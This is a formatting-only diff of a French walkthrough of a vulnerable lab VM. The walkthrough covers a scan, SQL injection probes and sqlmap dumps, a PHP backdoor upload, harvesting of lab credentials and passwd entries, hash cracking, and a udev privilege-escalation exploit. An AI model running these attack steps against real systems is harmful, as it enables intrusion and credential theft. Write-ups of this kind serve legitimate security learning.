@@ -17,7 +17,7 @@ Au passage, attention à ne pas ouvrir le PDF qui est présent dans l'archive ca
 Au début était le scan
 ----------------------
 
-```plain
+```
 Starting Nmap 6.46 ( http://nmap.org ) at 2014-05-31 14:32 CEST
 Nmap scan report for 192.168.1.95
 Host is up (0.10s latency).
@@ -71,7 +71,7 @@ Dans les pages originales créées pour le site ou trouve un paramètre qui semb
 
 Par exemple pour l'URL :
 
-```plain
+```
 http://192.168.1.95/?id=3
 ```
 
@@ -79,7 +79,7 @@ on obtient un article titré "Praesent magna est".
 
 Si on rajoute un OR 1 :
 
-```plain
+```
 http://192.168.1.95/?id=3%20or%201
 ```
 
@@ -87,7 +87,7 @@ alors tous les articles semblent retournés
 
 alors qu'avec un AND 1 :
 
-```plain
+```
 http://192.168.1.95/?id=3%20and%201
 ```
 
@@ -95,7 +95,7 @@ on retrouve seulement le "Praesent magna est".
 
 pour terminer avec un AND 0 :
 
-```plain
+```
 http://192.168.1.95/?id=3%20and%200
 ```
 
@@ -103,7 +103,7 @@ aucun article n'est renvoyé
 
 On lance tout de même *Wapiti* qui confirme la vulnérabilité et en trouve d'autres au passage :  
 
-```plain
+```
 [+] Lancement du module sql
 Injection MySQL dans http://192.168.1.95/?action=login via une injection dans le paramètre username
 Evil request:
@@ -174,7 +174,7 @@ Puis vint l'attaque
 
 On "fire up" un sqlmap comme d'habitude. Ce dernier nous permet de récupérer les informations suivantes concernant les pages faites-maison :  
 
-```plain
+```
 current user:    'cms_user@%'
 current database:    'cms'
 
@@ -187,7 +187,7 @@ current database:    'cms'
 
 L'option --dbs nous liste les bases de données existantes :  
 
-```plain
+```
 [*] cms
 [*] information_schema
 [*] mysql
@@ -197,7 +197,7 @@ L'option --dbs nous liste les bases de données existantes :
 
 Plus d'informations sur la base CMS avec *-D cms --tables* :  
 
-```plain
+```
 Database: cms
 [3 tables]
 +-------+
@@ -209,7 +209,7 @@ Database: cms
 
 Et enfin le dump de la table user (*-D cms -T user --dump*) :  
 
-```plain
+```
 Database: cms
 Table: user
 [1 entry]
@@ -230,7 +230,7 @@ Une fois connecté sur le CMS maison avec les identifiants *admin / adminpass*, 
 
 L'extension .php passe sans problème. On en profite pour uploader une backdoor plus évoluée.  
 
-```plain
+```
 sh-3.2$ id
 uid=48(apache) gid=48(apache) groups=48(apache)
 sh-3.2$ uname -a
@@ -242,7 +242,7 @@ CentOS release 5.2 (Final)
 
 Dans /var/www/html on trouve d'autres dossiers :
 
-```plain
+```
 total 72
 drwxr-xr-x 15 apache apache 4096 Jun 29  2009 .
 drwxr-xr-x  7 root   root   4096 Jun 29  2009 ..
@@ -266,7 +266,7 @@ drwxr-sr-x  2 apache apache 4096 Jun 23  2009 template
 
 Le fichier *conf/config.ini* contient les identifiants SQL pour le CMS :
 
-```plain
+```
 ;
 ; This is the configuration file
 ;
@@ -278,13 +278,13 @@ database_db     =       cms
 
 Et dans *roundcubemail-0.2-beta2/config/db.inc.php* :
 
-```plain
+```
 $rcmail_config['db_dsnw'] = 'mysql://root:mysqlpass@localhost/roundcube';
 ```
 
 On découvre plusieurs utilisateurs Unix sur le système :
 
-```plain
+```
 root:x:0:0:root:/root:/bin/bash
 bin:x:1:1:bin:/bin:/sbin/nologin
 daemon:x:2:2:daemon:/sbin:/sbin/nologin
@@ -328,7 +328,7 @@ toby:x:504:504::/home/toby:/bin/bash
 
 Dans le dossier logs on trouve un .htaccess (admin:mFiIPQcxSFjRA) qui se casse rapidement :  
 
-```plain
+```
 Loaded 1 password hash (Traditional DES [128/128 BS AVX-16])
 adminpas         (admin)
 ```
@@ -342,7 +342,7 @@ Le kernel est trop récent pour les failles ptrace et trop à jour pour vmsplice
 
 Finalement il fallait insister sur [l'exploit pour UDEV de Kingcope](http://www.exploit-db.com/exploits/8478/). On passe en argument le PID du udev (obtenu via ps) :  
 
-```plain
+```
 sh-3.2$ ./udev.sh 569
 suid.c: In function 'main':
 suid.c:3: warning: incompatible implicit declaration of built-in function 'execl'
